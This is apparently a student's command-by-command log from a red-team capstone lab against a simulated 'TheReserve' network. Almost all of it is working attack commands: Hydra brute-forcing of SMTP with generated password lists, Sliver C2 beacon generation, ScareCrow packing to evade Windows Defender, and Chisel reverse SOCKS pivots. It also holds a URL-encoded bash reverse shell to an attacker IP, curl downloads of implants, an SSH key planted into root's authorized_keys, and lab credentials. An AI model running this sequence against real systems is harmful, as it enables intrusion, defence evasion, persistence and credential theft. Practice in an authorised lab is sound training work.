# Red-Team-Capstone-Challenge CMD-by-CMDs


[[Red-Team-Capstone-Challenge-Credentials]]

```bash
sed -i 's///g' *-CMD-by-CMDs.md
```

```
The password policy for TheReserve is the following:

* At least 8 characters long
* At least 1 number
* At least 1 special character
* Special Characters: `  !@#$%^  `
```

```
ssh e-citizen@10.200.121.250
stabilitythroughcurrency

=======================================
Username: nvm
Password: PvH2VJqhnPMcbc0t
MailAddr: nvm@corp.th3reserve.loc
IP Range: 10.200.121.0/24
=======================================
```

Host management - update addDomainsToEctHosts.sh 
```bash
#!/bin/bash

echo "10.200.89.11 mail.thereserve.loc MAIL.thereserve.loc  " | sudo tee -a /etc/hosts
echo "10.200.89.12 thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.89.13 web.thereserve.loc WEB.thereserve.loc " | sudo tee -a /etc/hosts
# vpn key required
echo "10.200.89.21 WRK1.corp.thereserve.loc" | sudo tee -a /etc/hosts
echo "10.200.89.22 WRK2.corp.thereserve.loc " | sudo tee -a /etc/hosts
```

Replace the third octet IPs
```bash
sudo sed -i 's/.121./.118./g' /etc/hosts
sed 's/.117./.103./g' -i internalHosts.txt
sed 's/.116.126/.116.126/g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.md
```

Initial
```bash
curl http://10.200.121.13/october/themes/demo/assets/images/ -o images
cat images | cut -d '"' -f 8 | grep '.jpeg' | sed 's/.jpeg//g' > users.txt
# Developer on the root webapge.
echo "aimee.walker" >> users.txt
echo "patrick.edwards" >> users.txt
cat users.txt | awk '{print $1"@corp.thereserve.loc"}' >> emails.txt
echo "applications@corp.thereserve.loc" >> email.txt
crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
```

Silver and EDR bypassing Scarecrow
```go
// 
// remember to upx
// For VPN
generate --mtls 10.50.116.126:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
generate beacon --mtls 10.50.116.126:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
mtls -L 10.50.116.126 -l 11011
mtls -L 10.50.116.126 -l 11012

// Server 1
generate beacon --mtls 10.50.116.126:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
// ScareCrow to bypass Windows Defender - shoot fly with bozaka
./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
```

Chisel Organisation
```go
// remove glibc version issues be remove dependencies!
export CGO_ENABLED=0
go build -ldflags="-s -w"
// Edit proxychains file
sudo vim /etc/proxychains4.conf
socks5 $ip $port 
// VPN chisel server
./chisel server -p 20000 -reverse -socks -v


// VPN chisel Client - local pivot
nohup ./chisel client 10.50.116.126:20000 20001:127.0.0.1:20000 &
// 01-09 for individual VPN client pivots, socks, fowards
nohup ./chisel client 10.50.116.126:20000 R:127.0.01:20002:socks &


// 11-19 for individual * client pivots 

nohup ./chisel client $VPNipaddress:$specificPort $pivotPort:127.0.0.1:$pivotPort &

// reverse port forward syntax for the granular needs
nohup ./chisel client 10.50.116.126:20000 R:127.0.0.1:6379:172.19.0.2:6379 &

// reverse port forward syntax for the granular needs
nohup ./chisel client 10.50.116.126:20000 R:127.0.0.1: &
```


New
```bash
# https://stackoverflow.com/questions/7110119/bash-history-without-line-numbers
history | cut -c 8-
```

```bash
# 
gobuster vhost -u http://thereserve.loc -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -o vhosts.gb
#
gobuster dir -u http://mail.thereserve.loc -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  mail-dirs-raftsmallwords.gb
# $WORD from password_base_list
mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst
# Hydra the SMTP server
hydra -L lists/emails.txt -P mp32-passwd.lst mail.thereserve.loc smtp
```

Considerations
```
cracken -c '!@#$%^' -w password_base_list.txt '?w' -o smart-passwds.txt
```

```bash
# http://10.200.121.12/
mohammad.ahmed@corp.thereserve.loc

```

The 
```bash


sudo sed -i 's/.118./.119./g' /etc/hosts
sed 's/.103./.119./g' -i internalHosts.txt
sed 's/.116.126/.116.126/g' -i Red-Team-Capstone-Challenge-CMD-by-CMDs.md Red-Team-Capstone-Challenge-Credentials.md Red-Team-Capstone-Challenge-Helped-Through.md Red-Team-Capstone-Challenge-Notes.md

ssh e-citizen@10.200.119.250
stabilitythroughcurrency
# login for flags
Username: nvm
Password: PvH2VJqhnPMcbc0t
# 

# Linux Session
generate --mtls 10.50.116.126:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
# Linux Beacon 
generate beacon --mtls 10.50.116.126:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
# WRK 1 foothold

generate beacon -m 10.50.116.126:11013 -b http://10.50.116.126:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin

# WRK 1 Backup.exe apth hijack
generate beacon -m 10.50.116.126:11014 -b http://10.50.116.126:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Backup.bin
mtls -L 10.50.116.126 -l 11011
mtls -L 10.50.116.126 -l 11012
mtls -L 10.50.116.126 -l 11013
mtls -L 10.50.116.126 -l 11014

# scarecrow the bin for server01 takes ages and cpu cries, with obfu
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Backup.bin -Loader binary -domain bing.com -obfu
# cd to  directory and build
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"

# permissions
sudo chown kali:kali * && chmod +x *
# UPX!
upx brute *

# Start a listener, burpsuite and cmdi the vpn serve
python -m http.server 8443
rlwrap ncat -lvnp 36969 
;/bin/bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.116.126/36969+<%261'
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/zc3tx/DGZGDr7KWUlAzH5stPT7oySNhZqe+1snxmByRA7kiIIp8tly12x7vxFCvwhf7R7Sp1qR0Pzi5S5uAGO//+YD4ukVDtzA0F0oi2KjWsGZB5I0HUp7QERY8nb9yL3rfTC6HIMF0cCBUU0zNkVnCSYeZDG7WePSp7lblIOBmHd54a+3UAaShQc8Fadk0IQchW8MAvRcyQM7J0F2fT/aPTmUbv77VrUWFapgwuUBydXZA9eu+YOn9y1g5ID3QL6UpVHjNAjXPw1byRiyMRPUZcCL9No5fNa7Lu3e6xqB7qvgT20CQuohkpckWBroFoitG/K0VVsFFwQWaXvZGLwKJtvBwscDVIcFdoqfUO9JNNZ9G0Q97t1CZTuT9vRLvlRyOp1gir/iE45hCzchmpz8SM4RvGo8gvpnKWy8//noDas6nXqRxwvAEKe2S4nbSFBD5Xt7gTOH1gukutcN0TDQ+Iw0tYNXpHnIgKzhx/CseyPd+1KPhbTtq5T44W9yc=" > authorized_keys
curl http://10.50.116.126:8443/chisel -o chisel
sudo cp authorized_keys /root/.ssh/authorized_keys
# If required
ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "10.200.119.12"
ssh -i vpn_root.rsa root@10.200.119.12
# Tools
curl http://10.50.116.126:8443/VPN-upgrade -o VPN-upgrade
# As root
nohup ./VPN-upgrade &

# As www-data
./chisel server -host 10.50.116.126 -p 20000 --reverse --socks5 -v
# On the VPN
chmod +x *
nohup ./chisel client 10.50.116.126:20000  R:20001:socks &
# comment sock4 ... and add to /etc/proxychains4.conf:
socks5  127.0.0.1 20001
# rdp into server -1 
proxychains4 xfreerdp /u:lisa.moore /p:Scientist2006 /v:10.200.119.21
# Helpdesk
proxychains4 xfreerdp /u:laura /p:'Password1@' /v:10.200.119.21
# google chrome http://10.50.116.126:8443/ 
# Download Word.exe 
# open powershell 


# Linux beacon for later
curl http://10.50.116.126:8443/VPN-update -o VPN-update
nohup ./VPN-update &

```



## Installs

```bash
curl https://sliver.sh/install|sudo bash

sudo apt install thunderbird remmina certipy-ad neo4j bloodhound-y
# Authenicate
# ssh e-citizen@10.200.121.250 - stabilitythroughcurrency
thunderbird
# nvm : nvm@corp.th3reserve.loc $somePassword
# Change the outbound server to 587

git clone https://github.com/r3nt0n/bopscrk.git
cd bopscrk;
pip3 install -r requirements.txt
python3 bopscrk.py -i

cd ~/RedTeamCapstoneChallenge
curl -L https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule -o OneRuleToRuleThemAll.rule  

# Chisel building
# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation
go build -ldflags="-s -w" 
# Build for windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"

```

Crying because of password changes
```bash
nohup nmap -sC -sV -p- 10.200.119.0/24 -oN vpn-free-lunch-sc-sv --min-rate 2000 & 
```